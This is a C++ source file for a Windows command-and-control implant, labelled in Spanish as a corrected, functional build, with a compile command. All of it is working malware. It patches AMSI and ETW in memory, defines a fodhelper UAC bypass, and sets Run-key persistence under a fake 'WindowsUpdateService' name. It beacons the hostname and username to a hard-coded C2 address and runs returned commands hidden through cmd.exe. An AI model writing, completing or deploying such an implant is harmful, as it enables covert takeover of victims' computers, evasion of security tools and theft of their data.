/*
 * SilverGhost C2 Agent v3.0 - CORREGIDO Y FUNCIONAL
 * Compilación: x86_64-w64-mingw32-g++ -O2 -s -static -mwindows -o JDEXPLOIT_v3.exe silverghost_fixed.cpp -lwininet -lws2_32 -ladvapi32 -lshell32 -lcrypt32
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")

// --- CONFIGURACIÓN ---
#define C2_SERVER "192.168.254.146"
#define C2_PORT 9090

// ========== BASE64 (PARA COMPATIBILIDAD CON SERVIDOR) ==========
static const char b64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

std::string b64encode(const std::vector<BYTE>& data) {
    std::string result;
    int val = 0, valb = -6;
    for (BYTE c : data) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            result.push_back(b64_chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) result.push_back(b64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
    while (result.size() % 4) result.push_back('=');
    return result;
}

// ========== AMSI + ETW BYPASS (FUNCIONAL) ==========
void DisableDefenses() {
    // AMSI Bypass
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (hAmsi) {
        BYTE* pFunc = (BYTE*)GetProcAddress(hAmsi, "AmsiScanBuffer");
        if (pFunc) {
            DWORD oldProt;
            VirtualProtect(pFunc, 8, PAGE_EXECUTE_READWRITE, &oldProt);
            BYTE patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3, 0x00, 0x00};
            memcpy(pFunc, patch, 8);
            VirtualProtect(pFunc, 8, oldProt, &oldProt);
        }
    }
    
    // ETW Bypass
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        BYTE* pEtw = (BYTE*)GetProcAddress(hNtdll, "EtwEventWrite");
        if (pEtw) {
            DWORD oldProt;
            VirtualProtect(pEtw, 1, PAGE_EXECUTE_READWRITE, &oldProt);
            *pEtw = 0xC3;
            VirtualProtect(pEtw, 1, oldProt, &oldProt);
        }
    }
}

void UACBypass() {
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\open\\command", 
                        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        std::string cmd = std::string("cmd.exe /c start \"\" \"") + path + "\"";
        RegSetValueExA(hKey, "", 0, REG_SZ, (BYTE*)cmd.c_str(), cmd.length());
        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
        RegCloseKey(hKey);
        ShellExecuteA(NULL, "open", "fodhelper.exe", NULL, NULL, SW_HIDE);
        Sleep(3000);
        RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\open\\command");
    }
}

// ========== BEACON SIMPLE Y ESTABLE ==========
void Beacon() {
    HINTERNET hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) return;
    
    char hostname[256], username[256];
    DWORD size = sizeof(hostname);
    GetComputerNameA(hostname, &size);
    size = sizeof(username);
    GetUserNameA(username, &size);
    
    // Formato: hostname|username|OS
    std::string beacon_data = std::string(hostname) + "|" + username + "|Windows";
    
    while (true) {
        HINTERNET hConnect = InternetConnectA(hSession, C2_SERVER, C2_PORT, NULL, NULL, 
                                              INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect) {
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/", 
                                                  NULL, NULL, NULL, 
                                                  INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD, 0);
            if (hRequest) {
                const char* headers = "Content-Type: text/plain\r\n";
                
                if (HttpSendRequestA(hRequest, headers, strlen(headers), 
                                    (LPVOID)beacon_data.c_str(), beacon_data.length())) {
                    
                    // Leer respuesta del C2
                    char buffer[4096] = {0};
                    DWORD bytesRead;
                    std::string response;
                    
                    while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
                        buffer[bytesRead] = '\0';
                        response += buffer;
                    }
                    
                    // Ejecutar comando si no es el mensaje de keep-alive
                    if (!response.empty() && response != "JDEXPLOIT_ACTIVE") {
                        STARTUPINFOA si = {sizeof(si)};
                        PROCESS_INFORMATION pi;
                        si.dwFlags = STARTF_USESHOWWINDOW;
                        si.wShowWindow = SW_HIDE;
                        
                        std::string cmd = "cmd.exe /c " + response;
                        CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, 
                                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
                        WaitForSingleObject(pi.hProcess, 10000);
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                    }
                }
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        
        // Sleep entre beacons (3-8 segundos)
        Sleep(5000 + (rand() % 3000));
    }
    InternetCloseHandle(hSession);
}

// ========== PERSISTENCIA SIMPLE ==========
void InstallPersistence() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WindowsUpdateService", 0, REG_SZ, (BYTE*)path, strlen(path));
        RegCloseKey(hKey);
    }
}

// ========== ENTRY POINT ==========
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // Anti-sandbox (opcional)
    Sleep(3000);
    
    // Deshabilitar defensas
    DisableDefenses();
    
    // Persistencia
    InstallPersistence();
    
    // Iniciar beacon C2
    Beacon();
    
    return 0;
}
